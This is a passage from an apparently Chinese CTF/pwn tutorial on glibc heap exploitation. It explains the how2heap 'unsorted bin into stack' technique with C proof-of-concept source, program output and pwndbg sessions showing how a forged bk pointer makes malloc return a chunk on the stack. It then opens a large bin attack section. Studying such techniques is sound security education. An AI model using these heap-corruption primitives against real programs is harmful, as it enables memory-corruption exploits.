###  总结
程序首先定义了一个变量stack_var,紧接着malloc了两个chunk
之后Free掉了第一块chunk,并修改p->bk=&stack_var,这个时候再malloc出来
然后我们的变量值就被改成了unsorted bin(av)的地址
在正常使用中,因为unsorted bin写入的值并非可控值,因此只是起到一个辅助的作用
## 0x02 unsorted bin into stack
###  序
这个是unsorted bin attack 的第二例，是修改unsorted bin里chunk的bk指针来达到在栈上malloc出chunk的攻击方式
###  源代码
话不多说,我们直接看源码,同样的,我加了些注释
    #include 
    #include 
    #include 
    int main() {
      intptr_t stack_buffer[4] = {0};
      fprintf(stderr, "Allocating the victim chunkn");
      intptr_t* victim = malloc(0x100);
      fprintf(stderr, "Allocating another chunk to avoid consolidating the top chunk with the small one during the free()n");
      intptr_t* p1 = malloc(0x100);
      fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted binn", victim);
      free(victim);
      //在栈上伪造一个fake chunk
      fprintf(stderr, "Create a fake chunk on the stack");
      //设置下一次分配的大小并且把bk指针指向任意可写的地址
      fprintf(stderr, "Set size for next allocation and the bk pointer to any writable address");
      stack_buffer[1] = 0x100 + 0x10;
      stack_buffer[3] = (intptr_t)stack_buffer;
      //------------VULNERABILITY-----------      //现在假设我们有一个漏洞可以让我们覆写victim->size和victim->bk指针
      fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointern");
      //size必须和下一个请求的size不同以返回一个fake_chunk并且需要bypass 2*SIZE_SZ>16 && 2*SIZEsystem->mem 的检查
      fprintf(stderr, "Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && system_memn");
      victim[-1] = 32;
      victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
      //------------------------------------    
      //现在我们就可以返回我们的fake_chunk了
      fprintf(stderr, "Now next malloc will return the region of our fake chunk: %pn", &stack_buffer[2]);
      fprintf(stderr, "malloc(0x100): %pn", malloc(0x100));
    }
###  运行结果
    root@284662b4a7a3:~/how2heap/glibc_2.25# ./unsorted_bin_into_stack
    Allocating the victim chunk
    Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
    Freeing the chunk 0x1078010, it will be inserted in the unsorted bin
    Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
    Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && system_mem
    Now next malloc will return the region of our fake chunk: 0x7ffda9d27830
    malloc(0x100): 0x7ffda9d27830
###  关键代码调试
本例我一共下了五个断点
       12   intptr_t* p1 = malloc(0x100);
       13
     ► 14   fprintf(stderr, "Freeing the chunk %p, it will be inserted in the unsorted binn", victim);
       15   free(victim);
       16
     ► 17   fprintf(stderr, "Create a fake chunk on the stack");
       19   stack_buffer[1] = 0x100 + 0x10;
       20   stack_buffer[3] = (intptr_t)stack_buffer;
       21
       22   //------------VULNERABILITY-----------     ► 23   fprintf(stderr  , "Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointern");
       25   victim[-1] = 32;
       26   victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
       27   //------------------------------------       28
     ► 29   fprintf(stderr, "Now next malloc will return the region of our fake chunk: %pn", &stack_buffer[2]);
     ► 30   fprintf(stderr, "malloc(0x100): %pn", malloc(0x100));
       31 }
好了,下面开始运行一下,先分配两个指针
    pwndbg> heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602110 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602220 PREV_INUSE {
      prev_size = 0,
      size = 134625,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p/x stack_buffer
    $1 = {0x0, 0x0, 0x0, 0x0}
    pwndbg> p/x &stack_buffer
    $2 = 0x7fffffffe5b0
之后我们free掉victim,此时
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    smallbins
    empty
    largebins
    empty
然后我们修改一下栈的布局
    pwndbg> x/10gx stack_buffer
    0x7fffffffe5b0: 0x0000000000000000      0x0000000000000110
    0x7fffffffe5c0: 0x0000000000000000      0x00007fffffffe5b0
    0x7fffffffe5d0: 0x00007fffffffe6c0      0xae78811595436300
    0x7fffffffe5e0: 0x0000000000400870      0x00007ffff7a2d830
    0x7fffffffe5f0: 0x0000000000000000      0x00007fffffffe6c8
此时我们已经伪造了一个fake chunk,紧接着再覆写victim的size和bk指针
    pwndbg> x/10gx victim-2
    0x602000:       0x0000000000000000      0x0000000000000020
    0x602010:       0x00007ffff7dd1b78      0x00007fffffffe5b0
    0x602020:       0x0000000000000000      0x0000000000000000
    0x602030:       0x0000000000000000      0x0000000000000000
    0x602040:       0x0000000000000000      0x0000000000000000
    pwndbg> heap
    0x602000 {
      prev_size = 0,
      size = 32,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7fffffffe5b0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602020 {
      prev_size = 0,
      size = 0,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000
    BK: 0x602000 —▸ 0x7fffffffe5b0 ◂— 0x7fffffffe5b0
    smallbins
    empty
    largebins
    empty
由于刚刚的更改，我们的fake chunk已经被系统认为是链入到unsorted bin中的，所以最后malloc一下就可以返回我们的fake_chunk了
    pwndbg> heap
    0x602000 {
      prev_size = 0,
      size = 32,
      fd = 0x7ffff7dd1b88 ,
      bk = 0x7ffff7dd1b88 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x602020 {
      prev_size = 0,
      size = 0,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all [corrupted]
    FD: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
    BK: 0x7fffffffe5b0 ◂— 0x7fffffffe5b0
    smallbins
    0x20: 0x602000 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602000
    largebins
    empty
可以看到，我们之前的free bins被放进了small bin中
###  总结
程序先是在栈上定义了一个数组
随即分配了两个大小为0x100的chunk vitcim和chunk p1
紧接着释放了victim把他放进了unsorted bin中，之后在栈上伪造了一个fake chunk
最后修改了victim的Size和bk指针，将我们的fake chunk链入我们的unsorted bin中
此时我们再malloc一个合适大小的chunk就可以在我们的栈上malloc出来了
## large bin attack
###  序
对于large bin attack的利用研究任重而道远
在开始之前我一定要说一句,对glibc分配机制不熟悉的建议还是多看看(或者直接去看glibc2.29的内容,毕竟要紧跟时代潮流嘛,现在glibc2.29的题目也越来越多了